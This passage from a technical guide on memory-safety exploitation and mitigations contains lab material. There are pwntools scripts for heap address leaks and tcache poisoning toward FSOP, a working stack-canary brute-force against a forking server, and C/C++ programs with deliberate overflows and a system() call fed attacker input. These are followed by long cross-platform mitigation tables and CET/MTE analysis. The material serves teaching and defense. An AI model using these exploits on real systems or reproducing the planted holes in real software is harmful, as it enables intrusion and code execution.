                read(STDIN_FILENO, slots[idx].ptr, slots[idx].size);
                break;
            case 5:
                return 0;
        }
    }
}
```

**Exploitation strategy.** The attack proceeds in four phases:

Phase 1 — Leak a heap address by reading a freed tcache chunk's safe-linked `next` pointer. With safe-linking, the `next` pointer is XOR'd with `(chunk_addr >> 12)`. The first freed chunk's `next` is XOR'd with its own address shifted right by 12 bits and XOR'd with NULL (since the tcache bin was empty), yielding `0 ^ (chunk_addr >> 12) = chunk_addr >> 12`. Reading this value and shifting left by 12 recovers the heap page base.

Phase 2 — Leak a libc address by filling the tcache bin (7 chunks of the same size), then freeing one more chunk so it enters the unsorted bin. The unsorted bin chunk's `fd` and `bk` point into `main_arena` in libc's `.data` segment. Reading the freed unsorted-bin chunk's `fd` via the UAF leaks a libc address.

Phase 3 — Tcache poisoning. The attacker frees a chunk into tcache, then overwrites its safe-linked `next` pointer (via the UAF write) with the safe-linked encoding of the target address. The target is a writable location that contains or influences a code pointer — in this case, `_IO_list_all` in libc, which will be used for FSOP.

Phase 4 — Trigger code execution via FSOP. The attacker allocates from tcache (which returns the poisoned address), writes a crafted `_IO_FILE_plus` structure at the target, and triggers `_IO_flush_all_lockp` by calling `exit()` or causing an allocation failure.

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./vuln_tcache')

def alloc(idx):
    p.sendline(f'1 {idx}'.encode())

def free(idx):
    p.sendline(f'2 {idx}'.encode())

def read_slot(idx, size=0x80):
    p.sendline(f'3 {idx}'.encode())
    return p.recv(size)

def write_slot(idx, data):
    p.sendline(f'4 {idx}'.encode())
    p.send(data)

# Phase 1: Leak heap address via safe-linked tcache next pointer
alloc(0)
alloc(1)
free(0)

raw = read_slot(0)
safe_linked_next = u64(raw[:8])
heap_base = (safe_linked_next) << 12  # first freed chunk's next = addr>>12
log.info(f'Heap base (approx): {hex(heap_base)}')

# Phase 2: Leak libc address via unsorted bin fd
# Fill tcache (7 entries for size 0x80 + chunk header = 0x90)
for i in range(7):
    alloc(i)
alloc(7)   # this one will go to unsorted bin
alloc(8)   # guard chunk to prevent top-chunk consolidation

for i in range(7):
    free(i)
free(7)    # goes to unsorted bin (tcache full for this size)

libc_leak = u64(read_slot(7)[:8])
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # adjust per target
libc_base = libc_leak - (libc.symbols['main_arena'] + 96)  # adjust offset
log.info(f'libc base: {hex(libc_base)}')

# Phase 3: Tcache poisoning targeting _IO_list_all
# ... (target-specific FSOP payload construction follows)
# The full FSOP chain is detailed in §4.2 of this chapter

log.success('Exploit setup complete — FSOP payload delivery follows')
# Phase 4 would construct and write a fake _IO_FILE structure
# and trigger exit() or malloc failure
```

**Why this fails on exec() servers.** Unlike fork-without-exec servers (where the heap layout is inherited), a server that calls `exec()` for each connection gets a fresh heap with re-randomized ASLR. The attacker cannot reuse leaked addresses across connections. Each connection must independently leak and exploit, making multi-stage attacks significantly harder.

**Detection.** The rapid alloc/free/read pattern visible in application logs or syscall traces indicates heap probing. The unsafe-linking bypass requires reading a freed chunk — detectable via memory-safety tools (AddressSanitizer, MTE in sync mode). The final FSOP trigger via `exit()` or allocation failure may produce an unusual exit code or crash pattern.

### 10.4 Lab 4 — Stack canary bypass via fork server brute-force

This lab implements the fork-based canary brute-force described in §3.2 against a network service that calls `fork()` for each incoming connection.

**Vulnerable service.**

```c
/* vuln_fork_canary.c — forking network service for canary brute-force lab
 * Compile: gcc -o vuln_fork_canary vuln_fork_canary.c -fstack-protector-all
 * All stack frames protected by canary. ASLR and DEP also active. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 1337
#define BUF_SIZE 64

void handle_client(int sock) {
    char buf[BUF_SIZE];
    /* Read into buf without bounds check — overflow */
    ssize_t n = read(sock, buf, 256);
    /* Echo back the input (or a confirmation) */
    write(sock, "OK\n", 3);
}

int main(void) {
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = { .sin_family = AF_INET,
                                .sin_port = htons(PORT),
                                .sin_addr.s_addr = INADDR_ANY };
    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    listen(srv, 128);

    while (1) {
        int client = accept(srv, NULL, NULL);
        if (fork() == 0) {
            close(srv);
            handle_client(client);
            close(client);
            _exit(0);
        }
        close(client);
    }
}
```

The critical property: `fork()` copies the parent's address space, including the stack canary value. Every child has the same canary. The attacker can test one candidate byte per connection.

**Brute-force exploit.**

```python
from pwn import *
import sys

context.log_level = 'warning'

HOST = '127.0.0.1'
PORT = 1337
BUF_SIZE = 64  # known buffer size

def try_byte(known_canary_bytes, candidate):
    """Send overflow that extends one byte past current known canary.
    Return True if the child survives (byte is correct)."""
    try:
        r = remote(HOST, PORT, timeout=2)
        payload = b'A' * BUF_SIZE + known_canary_bytes + bytes([candidate])
        r.send(payload)
        # If the child survives, it sends "OK\n"
        data = r.recv(3, timeout=2)
        r.close()
        return data == b'OK\n'
    except Exception:
        return False

canary = b'\x00'  # first byte is always 0x00 on x86_64 Linux
log.info('Starting canary brute-force...')

for byte_pos in range(1, 8):
    for candidate in range(256):
        if try_byte(canary, candidate):
            canary += bytes([candidate])
            print(f'[+] Byte {byte_pos}: 0x{candidate:02x}  '
                  f'canary so far: {canary.hex()}')
            break
    else:
        print(f'[-] Failed to find byte {byte_pos}', file=sys.stderr)
        sys.exit(1)

print(f'[+] Full canary: 0x{canary[::-1].hex()}')

# With the canary known, construct the full overflow payload:
# [buffer (64)] [canary (8)] [saved RBP (8)] [return address (8)]
# The return address is set to a target (one-gadget, system, etc.)
# which requires a separate ASLR leak — omitted here for focus on canary bypass.
```

This completes in approximately 7 * 128 = 896 attempts on average (128 average per byte, 7 unknown bytes). At one connection per 10ms against a local target, the brute-force takes under 10 seconds.

**Why this fails on exec() servers.** If the server calls `exec()` instead of `fork()` (or `fork()` followed by `exec()`), each child gets a new canary from `AT_RANDOM` (which the kernel re-derives for each `execve`). The byte-by-byte approach no longer works because the canary changes between connections. The server must use `fork()` without `exec()` for the attack to succeed.

**Detection.** The fork brute-force produces a distinctive signal: hundreds of child-process crashes within minutes, all from the same parent PID, each crashing with `SIGABRT` from `__stack_chk_fail`. Sigma Rule 4 (§9.1) targets exactly this pattern. Additionally, the network connection pattern — many short-lived connections from the same source, each sending a slightly different payload — is detectable by network IDS.

### 10.5 Lab 5 — CFI bypass via counterfeit objects (COOP)

This lab demonstrates a simplified COOP attack (§5.1) against a C++ program compiled with Clang's CFI (`-fsanitize=cfi`). The attacker constructs counterfeit objects with valid vtable pointers that satisfy CFI checks but whose field values cause the virtual methods to perform unintended operations.

**Vulnerable program.** A plugin system that iterates over a vector of base-class pointers and calls a virtual method on each. The attacker can corrupt heap memory to insert counterfeit objects.

```cpp
/* vuln_coop.cpp — simplified COOP target for CFI bypass lab
 * Compile: clang++ -o vuln_coop vuln_coop.cpp -fsanitize=cfi
 *          -fvisibility=hidden -flto -fno-sanitize-recover=all
 *          -fuse-ld=lld */
#include <cstdio>
#include <cstring>
#include <vector>
#include <unistd.h>

class Plugin {
public:
    virtual void execute() = 0;
    virtual ~Plugin() = default;
};

class LogPlugin : public Plugin {
public:
    char *message;      // controlled field
    void execute() override {
        printf("LOG: %s\n", message);  // printf with controlled string
    }
};

class ExecPlugin : public Plugin {
public:
    char *command;       // controlled field
    void execute() override {
        system(command);  // system() with controlled string — the "W-G" gadget
    }
};

void run_plugins(std::vector<Plugin*> &plugins) {
    for (auto *p : plugins) {
        p->execute();  // CFI-checked virtual call
    }
}

/* Simulate heap corruption: attacker can write to a freed Plugin slot */
int main() {
    std::vector<Plugin*> plugins;

    auto *log = new LogPlugin();
    log->message = strdup("System starting");
    plugins.push_back(log);

    auto *exec = new ExecPlugin();
    exec->command = strdup("echo 'normal operation'");
    plugins.push_back(exec);

    /* Simulated UAF: attacker overwrites exec's command field */
    char attacker_input[256];
    read(STDIN_FILENO, attacker_input, sizeof(attacker_input));
    /* BUG: overwrite exec->command pointer via heap corruption simulation */
    exec->command = attacker_input;

    run_plugins(plugins);
    return 0;
}
```

In this simplified scenario, the `ExecPlugin::execute()` method is a legitimate CFI-valid target (it is a real virtual method of the correct class hierarchy). The attacker does not need to redirect the vtable — they only need to control the `command` field of an existing `ExecPlugin` object. By writing `"/bin/sh"` to the corrupted field, the legitimate virtual call to `execute()` calls `system("/bin/sh")`.

This is the simplest form of COOP: using a valid virtual method with attacker-controlled data fields. Full COOP chains against real-world software (browsers, office suites) involve chaining multiple virtual method calls through a container iteration pattern, where each call produces a side effect that sets up the next call's arguments.

**Why hardware CFI makes this harder.** On systems with Intel CET or ARM PAC+BTI, the virtual call dispatch is still constrained to valid targets, but the fundamental COOP problem remains: if a valid method performs a dangerous operation with attacker-controlled data, CFI alone cannot prevent misuse. Hardware CFI prevents the attacker from redirecting control flow to arbitrary code, but it does not enforce data-flow integrity. Defenses against COOP require data-flow integrity mechanisms (e.g., ensuring that the `command` field cannot be modified after initialization) or sandboxing the dangerous operations (e.g., `system()` filtered by seccomp).

---

## 11. Platform-specific mitigation comparison

The mitigations discussed in §1–§8 are implemented differently across operating systems and architectures. This section provides a cross-platform comparison matrix and highlights implementation-specific differences that affect the bypass landscape.

### 11.1 ASLR implementation comparison

| Property | Linux x86_64 | Windows x64 | macOS (arm64) | Android (arm64) | iOS (arm64) |
|----------|-------------|-------------|---------------|-----------------|-------------|
| Stack entropy | 22 bits | 17 bits (HEASLR) | ~24 bits | ~24 bits | ~24 bits |
| mmap/library entropy | 28 bits | 17-19 bits (HEASLR) | ~24 bits | ~24 bits | ~24 bits |
| Heap entropy | 13 bits (brk) | 8 bits (LFH) | Implementation-dependent | Scudo-managed | Scudo-managed |
| PIE default | Distro-dependent | Yes (since VS 2012) | Yes | Yes | Yes |
| Per-exec re-randomization | Yes | Yes | Yes | Yes | Yes |
| Per-boot re-randomization | No (per-exec) | No (per-exec) | No (per-exec) | No (per-exec) | No (per-exec) |
| Kernel ASLR entropy | ~9 bits (text) | ~25 bits | Unknown (opaque) | ~16 bits | Unknown |

Windows High Entropy ASLR (HEASLR, enabled via `/HIGHENTROPYVA` linker flag) increases the randomization space by using the full 64-bit address range for allocations, providing substantially more entropy than the base ASLR. However, many older applications and third-party DLLs are not compiled with HEASLR, reducing the effective entropy for those components.

On macOS and iOS, ASLR is always active and the entropy values are not publicly documented with precision — Apple does not publish the exact bit counts. The ARM64 address space provides room for high entropy, and Apple's DYLD implements independent randomization of each shared cache, the executable, and the stack/heap regions.

Android's adoption of 39-bit or 48-bit virtual address spaces (depending on `CONFIG_ARM64_VA_BITS`) and mandatory PIE for all native code since Android 5.0 means that ASLR entropy is generally higher than on Linux distributions that still support non-PIE executables.

### 11.2 DEP/NX and W^X enforcement

| Property | Linux | Windows | macOS | Android | iOS |
|----------|-------|---------|-------|---------|-----|
| Default NX | Yes (hardware) | Yes (hardware) | Yes (hardware) | Yes (hardware) | Yes (hardware) |
| W^X strict | No (mprotect allowed) | No (VirtualProtect allowed) | Enforced for signed apps | No (mprotect allowed) | Strict (no JIT for 3rd-party) |
| JIT exceptions | JIT engines use mprotect | JIT via VirtualAlloc | Hardened runtime exemptions | ART uses mprotect | Only WebKit JIT (Apple-signed) |
| Seccomp mprotect filter | Optional, per-process | N/A (use ACG instead) | N/A (use Hardened Runtime) | Bionic seccomp filters | Kernel enforcement |
| ACG (block dynamic code) | No equivalent | Yes (Win10 CU+) | Via Hardened Runtime | No direct equivalent | Kernel-enforced |

iOS stands out with the strictest W^X enforcement: third-party applications cannot create writable-and-executable memory at all. Only Apple-signed processes (Safari's WebKit JIT) are granted the `dynamic-codesigning` entitlement that allows JIT compilation. This makes shellcode injection fundamentally impossible on iOS without a kernel exploit to modify page table permissions directly. This design choice is the single most impactful anti-exploitation measure on any major platform.

Windows ACG (Arbitrary Code Guard), enabled via `SetProcessMitigationPolicy` with `ProcessDynamicCodePolicy`, prevents a process from allocating new executable memory or modifying existing code pages. Under ACG, the `VirtualProtect`/`VirtualAlloc` ROP chains described in §2.5 fail at the kernel level. Microsoft Edge enables ACG for renderer processes, forcing attackers into pure code-reuse exploitation.

### 11.3 Stack protection comparison

| Property | Linux (GCC/Clang) | Windows (MSVC) | macOS (Clang) | Android (Clang) |
|----------|-------------------|----------------|---------------|-----------------|
| Canary implementation | `fs:0x28` random value | `/GS` cookie XOR'd with frame pointer | `gs:0x28` or `__stack_chk_guard` | `__stack_chk_guard` |
| Frame-dependent cookie | No | Yes (XOR with EBP/RSP) | No | No |
| Default protection level | `-fstack-protector-strong` | `/GS` (always on since VS2005) | `-fstack-protector-strong` | `-fstack-protector-strong` |
| SafeStack | Available (`-fsanitize=safe-stack`) | Not available | Available | Available |
| Shadow stack (hardware) | CET (Intel, Linux 6.6+) | CET (Windows 11+) | Not deployed | ARMv9 GCS (future) |

MSVC's `/GS` cookie is unique in being XOR'd with the frame pointer, making a leaked cookie from one function unusable in another function's frame (the XOR value differs). This provides modest additional resistance against canary-leak attacks compared to the Linux/macOS approach where the canary is a single process-wide value stored in TLS.

### 11.4 CFI implementations across platforms

**Linux — LLVM CFI.** Clang's `-fsanitize=cfi` provides fine-grained forward-edge CFI with type-based checks. Requires Link-Time Optimization (`-flto`) for cross-module analysis. The Linux kernel uses `CONFIG_CFI_CLANG` (since Linux 5.13) for kernel-mode CFI, with `kcfi` as a lighter-weight alternative that does not require LTO (`CONFIG_CFI_CLANG` replaced by `CONFIG_KCFI` in 6.1+). Forward-edge only — backward-edge requires CET shadow stack or Safe Stack separately.

**Windows — CFG and XFG.** Control Flow Guard (CFG) maintains a bitmap of valid indirect-call targets. The bitmap is populated at compile time (MSVC `/guard:cf`) and checked at runtime by `ntdll!LdrpValidateUserCallTarget`. The overhead is approximately 1-2% for bitmap lookup on each indirect call. Extended Flow Guard (XFG) adds a type hash to each call site, reducing the valid target set per call to functions with matching prototypes. XFG is deployed in Windows 11 and Microsoft Edge. CFG/XFG are forward-edge only.

**macOS/iOS — PAC (Pointer Authentication).** On Apple Silicon (M1/A12+), pointer authentication signs code and data pointers with a cryptographic MAC using hardware keys. Five key registers (APIAKey, APIBKey, APDAKey, APDBKey, APGAKey) allow signing with different keys for different contexts (code vs. data, user vs. kernel). The authentication check is performed by `AUTIA`/`AUTIB`/`AUTDA`/`AUTDB` instructions. PAC protects both forward-edge (function pointers) and backward-edge (return addresses, signed with `PACIASP`/`RETAA`). Bypass requires a signing oracle (§5.6) or a hardware side-channel (PACMAN).

**Android — Hardware CFI and MTE.** Android deploys LLVM CFI for native code in system libraries and uses `-fsanitize=cfi` in the Android Platform build. Since Android 14, ARM MTE is supported on MTE-capable hardware (Pixel 8 and later with Tensor G3). MTE provides probabilistic detection of spatial and temporal memory safety violations, complementing CFI's control-flow protection with data-integrity checking.

### 11.5 Heap hardening comparison

| Property | glibc ptmalloc2 | Windows Segment Heap | PartitionAlloc (Chrome) | Scudo (Android/LLVM) | jemalloc (Firefox/FreeBSD) |
|----------|-----------------|---------------------|------------------------|---------------------|---------------------------|
| Safe-linking | Yes (glibc 2.32+) | N/A (different design) | N/A (different design) | Yes | No |
| Guard pages | No (optional with `MALLOC_MMAP_THRESHOLD_`) | Yes (between segments) | Yes (super pages) | Configurable | No |
| Quarantine | No | No | BackupRefPtr quarantine | Yes (configurable) | Yes (jemalloc 5.x) |
| Randomized allocation | No (deterministic tcache) | Yes (LFH randomization) | Yes (slot randomization) | Yes | Yes (slab randomization) |
| MTE integration | glibc 2.38+ experimental | N/A (x86 only) | Chrome MTE experiments | Yes (native) | No |

PartitionAlloc (used by Chrome) is notable for its type-based partitioning: different object types are allocated from separate pools, preventing cross-type confusion attacks. BackupRefPtr (a use-after-free mitigation in Chrome) maintains reference counts on allocations and quarantines freed memory until all dangling pointers are cleared. This significantly raises the bar for UAF exploitation in Chrome, as the freed memory is not immediately reusable.

Scudo (the default allocator on Android and available as a standalone LLVM allocator) implements chunk header checksums, primary and secondary allocator separation, quarantine for delayed reuse, and optional MTE integration. The quarantine holds freed chunks for a configurable period, preventing immediate reuse by an attacker and increasing the window for MTE tag mismatch detection.

### 11.6 Windows-specific mitigations deep dive

**Control Flow Guard (CFG).** CFG's valid-target bitmap is a per-process data structure in user space. Each bit represents an 8-byte-aligned address; a set bit indicates the address is a valid indirect-call target. The check is performed by `_guard_check_icall` (or `_guard_dispatch_icall` for dispatch-style calls), which indexes into the bitmap and verifies the target bit is set. The bitmap is populated by the linker based on address-taken functions and can be updated at runtime via `SetProcessValidCallTargets`. The coarse granularity (any address-taken function is valid from any call site) makes CFG vulnerable to the valid-target-set attacks described in §5.2.

**Process Mitigation Policies.** Windows provides `SetProcessMitigationPolicy` for per-process mitigation enforcement:

```c
/* Enable ACG (Arbitrary Code Guard) for the current process */
PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = { 0 };
policy.ProhibitDynamicCode = 1;
SetProcessMitigationPolicy(ProcessDynamicCodePolicy,
                           &policy, sizeof(policy));

/* Enable CFG strict mode (terminate on invalid target) */
PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg = { 0 };
cfg.EnableControlFlowGuard = 1;
cfg.StrictMode = 1;
SetProcessMitigationPolicy(ProcessControlFlowGuardPolicy,
                           &cfg, sizeof(cfg));
```

These policies, once set, cannot be relaxed for the process's lifetime. This makes them robust against exploitation — an attacker who achieves code execution within the process cannot disable the mitigations (they would need kernel-level access to modify the process's mitigation flags in the `EPROCESS` structure).

### 11.7 macOS/iOS-specific mitigations

**Hardened Runtime.** macOS applications signed with the Hardened Runtime entitlement are subject to restrictions analogous to iOS: library validation (only Apple-signed or developer-signed libraries can be loaded), `DYLD_INSERT_LIBRARIES` is ignored, debugging is restricted, and dynamic code generation requires an explicit entitlement. The Hardened Runtime is mandatory for notarized macOS applications (since macOS 10.14.5).

**PAC diversity.** Apple's PAC implementation uses context diversity to prevent PAC forgery across different call sites. Return address PACs use the stack pointer (`sp`) as context, so a return address signed at one stack depth cannot be replayed at a different depth. Data pointer PACs can use a static context (a compile-time constant) or a dynamic context (the address of the containing object), binding the signed pointer to its specific storage location.

### 11.8 Android-specific mitigations

**MTE deployment.** Android 14 introduced system-wide MTE support with three modes configurable per-process: SYNC (synchronous tag check, deterministic fault on mismatch, ~10-20% overhead), ASYNC (asynchronous tag check, eventual fault, ~3-5% overhead), and ASYMM (asymmetric: synchronous for stores, asynchronous for loads, ~5-10% overhead). Google's Pixel 8 ships with MTE enabled in ASYNC mode for most system processes and SYNC mode for security-critical processes (Zygote, SurfaceFlinger, media codecs).

**GWP-ASan.** Guard With Page-allocator Address Sanitizer is a sampling-based heap error detector deployed in Android production. It allocates a small percentage of heap allocations using a page-granularity allocator with guard pages, detecting use-after-free and buffer overflows for sampled allocations. The overhead is negligible at the sampling rate used in production (~0.01% of allocations), and the crash reports provide precise root-cause information for heap bugs.

**HWASan.** Hardware Address Sanitizer is a tag-based memory error detector that uses AArch64 Top Byte Ignore (TBI) to store a tag in the pointer's top byte. Each heap allocation receives a random tag, and the corresponding memory region's shadow memory stores the expected tag. On access, the hardware passes the tagged pointer through (TBI ignores the top byte for address translation), and a software check in the HWASan runtime compares the pointer's tag against the shadow memory. HWASan runs with approximately 15-20% overhead and is used in Android's continuous fuzzing infrastructure (CTS, VTS) and optional production builds.

### 11.9 Linux CET kernel configuration

Enabling CET on Linux requires both hardware support (Intel 12th-gen+) and kernel build options. The relevant Kconfig symbols and their dependencies are:

```
# Kernel .config for CET support (Linux 6.6+)

# Shadow stack for userspace processes
CONFIG_X86_USER_SHADOW_STACK=y
# Requires: CONFIG_AS_WRUSS=y (assembler supports WRUSS instruction)
# Requires: CONFIG_X86_64=y

# IBT for kernel indirect branches (Linux 6.2+)
CONFIG_X86_KERNEL_IBT=y
# Requires: CONFIG_CC_HAS_IBT=y (compiler supports -fcf-protection=branch)
# Requires: CONFIG_X86_64=y
# Requires: CONFIG_HAVE_OBJTOOL=y (objtool validates ENDBR placement)

# kcfi (Clang CFI alternative to IBT, mutually exclusive)
# CONFIG_CFI_CLANG=y   # requires CONFIG_LTO_CLANG_THIN=y
# Do NOT enable both CONFIG_X86_KERNEL_IBT and CONFIG_CFI_CLANG

# Verify at boot:
# dmesg | grep -E "(CET|shadow stack|IBT)"
# Expected: "x86/shstk: Enabling shadow stack"
# Expected: "x86/ibt: Indirect Branch Tracking enabled"
```

Userspace shadow stack enablement is opt-in per-binary via the GNU property note `GNU_PROPERTY_X86_FEATURE_1_SHSTK` in the ELF header. GCC 8+ and Clang 7+ emit this property when compiled with `-fcf-protection=full` or `-fcf-protection=return`. The dynamic linker (`ld-linux.so`) enables shadow stacks for the process only if every loaded shared library carries the property note — a single legacy library without the note disables shadow stacks for the entire process. This all-or-nothing model is the primary deployment obstacle for CET shadow stacks on Linux, as many third-party shared libraries have not been recompiled with CET support.

Runtime verification from userspace:

```c
#include <sys/prctl.h>
#include <stdio.h>

int main(void) {
    /* Check if shadow stack is active for this process */
    unsigned long features = 0;
    int ret = prctl(PR_GET_SHADOW_STACK_STATUS, &features, 0, 0, 0);
    if (ret == 0 && (features & PR_SHADOW_STACK_ENABLE))
        printf("Shadow stack: ACTIVE\n");
    else
        printf("Shadow stack: INACTIVE (ret=%d, features=0x%lx)\n",
               ret, features);
    return 0;
}
```

### 11.10 Cross-platform mitigation effectiveness summary

The following table summarizes the overall mitigation posture per platform against the exploit classes discussed in §1-§8, rated as **Strong**, **Moderate**, or **Weak** based on default configurations (not hardened/optional modes):

| Exploit Class | Linux (default) | Windows 11 | macOS (arm64) | Android 14 | iOS 17 |
|---------------|----------------|------------|---------------|------------|--------|
| ASLR bypass (§1) | Moderate (high entropy but /proc leaks) | Moderate (HEASLR gaps) | Strong (high entropy, opaque) | Strong (mandatory PIE, high entropy) | Strong |
| DEP bypass (§2) | Weak (mprotect unrestricted) | Moderate (ACG opt-in) | Strong (Hardened Runtime W^X) | Moderate (mprotect available) | Strong (strict W^X) |
| Canary bypass (§3) | Moderate (global canary) | Moderate (/GS XOR cookie) | Moderate (global canary) | Moderate (global canary) | Moderate |
| RELRO/GOT bypass (§4) | Strong (Full RELRO common) | N/A (different linking) | Strong (Full RELRO) | Strong (Full RELRO) | N/A |
| CFI bypass (§5) | Moderate (LLVM CFI optional) | Moderate (CFG coarse) | Strong (PAC hardware) | Strong (CFI + MTE) | Strong (PAC) |
| KASLR bypass (§6) | Weak (~9 bit text) | Moderate (~25 bit) | Strong (opaque) | Moderate (~16 bit) | Strong |
| Shadow stack bypass (§7) | Moderate (CET new, opt-in) | Moderate (CET Win11+) | Strong (PAC return) | Weak (not deployed) | Strong (PAC) |
| Heap exploit (§8/Domain 3) | Weak (ptmalloc2) | Moderate (Segment Heap) | Moderate | Strong (Scudo + MTE) | Strong |

The "Strong" ratings for iOS across most categories reflect its locked-down model: mandatory code signing, strict W^X, hardware PAC, and minimal user-accessible attack surface. Android 14 with MTE-capable hardware (Pixel 8+) achieves comparable protection for heap exploitation through hardware-assisted tag checking, a capability no other platform matches.

---

## 12. Emerging mitigations and future directions

The mitigation landscape continues to evolve as hardware vendors deploy new security features and the software ecosystem adapts. This section examines the technologies that will reshape the bypass landscape in the 2025–2030 timeframe.

### 12.1 Intel CET detailed analysis

Intel Control-flow Enforcement Technology (CET) provides two complementary mechanisms: Shadow Stack (SS) for backward-edge protection and Indirect Branch Tracking (IBT) for forward-edge protection. CET has been available in Intel 12th-generation (Alder Lake) and later processors, with operating system support in Windows 11 (shadow stacks for user-mode) and Linux 6.6+ (both user-mode and kernel-mode).

**Shadow Stack internals.** CET shadow stacks use a dedicated page type (set via the `PAGE_SHADOW_STACK` attribute in page table entries) that is writable only by shadow-stack-specific instructions (`CALL`, `RET`, and `WRSS`). Normal `MOV` stores to shadow stack pages fault with `#PF`. On every `CALL`, the hardware pushes the return address to both the normal stack and the shadow stack. On every `RET`, the hardware pops from both stacks and compares — a mismatch raises `#CP` (Control Protection Exception).

The `WRSS` instruction (Write to Shadow Stack) allows software to explicitly write to shadow stack pages. `WRSS` is intended for runtime support (signal delivery, `longjmp`, context switching) and is controlled by the `WRSS` bit in the CET state MSR. On Linux, `WRSS` is disabled for user-mode processes by default — signal delivery and `sigreturn` use a kernel-managed restore token protocol instead. The kernel places a restore token on the shadow stack during signal delivery and validates it during `sigreturn`, preventing the attacker from forging shadow stack state via `sigreturn` manipulation.

**IBT internals.** IBT requires that every valid indirect branch target begins with an `ENDBR64` (or `ENDBR32`) instruction. An indirect branch (`JMP reg`, `CALL reg`, `JMP [mem]`, `CALL [mem]`) sets an internal CPU state flag ("TRACKER" state) that expects the next instruction to be `ENDBR`. If the next instruction is not `ENDBR`, the CPU raises `#CP`. `ENDBR` is encoded as a 4-byte NOP on non-CET hardware, so CET-instrumented binaries run unchanged on older CPUs.

The `ENDBR`-only constraint is coarse-grained — it is equivalent to CFG's "any address-taken function" policy. Every function entry point has `ENDBR`, and the attacker can target any of them. Fine-grained forward-edge CFI (Clang CFI, XFG) remains necessary for meaningful forward-edge restriction. The Linux kernel uses `CONFIG_X86_KERNEL_IBT` (since Linux 6.2) to enable IBT for kernel-mode indirect calls.

**Known bypass research.** Academic research has identified several CET bypass vectors. Shadow stack switching attacks exploit the `RSTORSSP` and `SAVEPREVSSP` instructions, which manage shadow stack tokens for context switching. If the attacker can manipulate the token (stored in normal memory that acts as a reference for the shadow stack setup), they can redirect the shadow stack to an attacker-controlled region. The mitigation is supervisor-level enforcement of token validity. IBT gadget availability research (Fabian Beterke, 2023) measured that large binaries (Chrome, Firefox) contain thousands of `ENDBR`-prefixed targets, confirming that IBT alone does not meaningfully restrict the attacker's target set for forward-edge attacks.

**Performance impact.** Intel reports CET overhead at less than 2% for typical workloads. Shadow stack operations add a memory access per `CALL`/`RET`, but the shadow stack is typically cache-hot. IBT adds a comparison per indirect branch, resolved in the decode stage with negligible pipeline impact. Real-world measurements on SPEC CPU 2017 show 0.5-1.5% overhead for shadow stacks and under 0.5% for IBT.

### 12.2 ARM MTE in depth

Memory Tagging Extension (MTE), introduced in ARMv8.5-A, assigns a 4-bit tag to every aligned 16-byte granule of memory. Pointers carry a 4-bit tag in bits 59:56 (using the Top Byte Ignore feature to make these bits available without affecting address translation). On every memory access, the hardware compares the pointer's tag against the memory's tag. A mismatch raises a Tag Check Fault.

**Tag granule and storage.** Each 16-byte granule has a 4-bit tag stored in a dedicated region of physical memory (the "tag memory"), provisioned by the hardware at a ratio of 1 tag byte per 32 bytes of data (two tags per byte, since each tag is 4 bits). This adds approximately 3% memory overhead for the tag storage.

**SYNC vs. ASYNC vs. ASYMM modes.** In SYNC mode (`PSTATE.TCO=0`, synchronous tag checks), a tag mismatch causes an immediate synchronous Data Abort exception. The faulting instruction is precisely identified, and the program state is consistent — making debugging and deterministic detection straightforward. The overhead is approximately 10-20% due to the serializing nature of the tag check.

In ASYNC mode, tag check faults are accumulated in a system register (`TFSR_EL1`) and delivered as an asynchronous exception at the next kernel entry point (syscall, interrupt, exception). The faulting instruction is not precisely identified — only the fact that a mismatch occurred since the last check. Overhead is approximately 3-5% because the tag check does not serialize the memory pipeline.

ASYMM mode applies synchronous checking to stores and asynchronous checking to loads, balancing detection precision (stores are the corruption source) against performance (loads are more frequent).

**Probabilistic vs. deterministic detection.** With 4-bit tags (16 possible values), a random tag has a 1/16 (6.25%) probability of matching a corrupted pointer's tag by chance. For a single memory corruption, detection probability is approximately 93.75%. For an exploit chain that involves N independent corruptions (heap spray, tcache poisoning, FSOP), the probability of evading all checks is (1/16)^N — vanishingly small for N > 3. This probabilistic model means MTE does not guarantee detection of every corruption, but it makes multi-stage exploitation extremely unreliable.

**MTE bypass research.** Published research has identified several MTE bypass strategies. Tag oracle attacks use a side-channel (timing, exception behavior) to determine the expected tag for a target granule, allowing the attacker to forge a matching pointer. Speculative tag checks were investigated by analogy with PACMAN — if speculative execution can proceed past a tag check and produce a measurable side-channel, the attacker could brute-force tags at CPU speed. ARM's implementation appears to raise the Tag Check Fault synchronously in the execution pipeline (SYNC mode) or accumulate it without allowing speculative forwarding of mismatched data (ASYNC mode), but hardware-specific behavior varies by implementation. Tag reuse patterns exploit the fact that freed memory receives a new random tag, but the new tag is chosen from only 15 possible values (excluding the old tag, or truly random from 16). If the attacker can predict or observe the new tag assignment pattern, they can forge pointers with the correct tag.

**Deployment.** MTE hardware is available in ARM Cortex-X3/X4/A720 cores and Google Tensor G3+. Android 14 provides userspace MTE support. Chrome has experimental MTE support for its PartitionAlloc allocator. The Linux kernel supports MTE for both kernel allocations (`CONFIG_KASAN_HW_TAGS`) and user-space tag management (via `prctl(PR_SET_TAGGED_ADDR_CTRL)`).

**MTE mode performance benchmarks.** The following table compiles measured overhead data from Google's Android MTE deployment reports (2023-2024) and ARM's Cortex-X4 reference measurements:

| Benchmark / Workload | SYNC overhead | ASYNC overhead | ASYMM overhead | Notes |
|----------------------|--------------|----------------|----------------|-------|
| SPEC CPU 2017 (int) | 14-18% | 2-4% | 5-8% | Geomean across int_rate suite |
| SPEC CPU 2017 (fp) | 8-12% | 1-3% | 3-6% | Lower due to fewer pointer ops |
| Android system_server | 16% | 3% | 7% | Measured on Pixel 8 (Tensor G3) |
| Chrome PartitionAlloc | 10-15% | 2-5% | 4-8% | DOM-heavy browsing workload |
| SQLite (OLTP) | 12% | 4% | 6% | Transaction-heavy, frequent alloc/free |
| malloc microbenchmark | 20-25% | 5-8% | 10-15% | Worst-case: tight alloc/free loop |
| Memory bandwidth (STREAM) | <2% | <1% | <1% | Tag check overhead amortized in burst transfers |

